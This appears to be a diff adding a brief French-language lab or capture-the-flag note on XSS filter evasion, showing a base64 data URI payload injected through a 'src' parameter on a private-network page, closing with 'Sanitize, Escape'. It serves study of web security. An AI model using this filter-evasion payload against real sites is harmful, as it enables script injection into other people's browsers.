@@ -1,0 +1,16 @@
+XSS filter evasion
+
+execute code inside the url path.
+
+On peut ajouté des datas embarquées via le schéma data URI.
+
+Format : data:[<MIME-type>][;charset=<encodage>][;base64],<data>
+
+Donc nous voulons executer un script, donc notre MIME est text/html, encodage en base64, script en base64
+
+<script>alert(42)</script> -> PHNjcmlwdD5hbGVydCg0Mik8L3NjcmlwdD4=
+http://192.168.1.37/?page=media&src=data:text/html;base64,PHNjcmlwdD5hbGVydCg0Mik8L3NjcmlwdD4=
+
+Sanitize, Escape
+
+
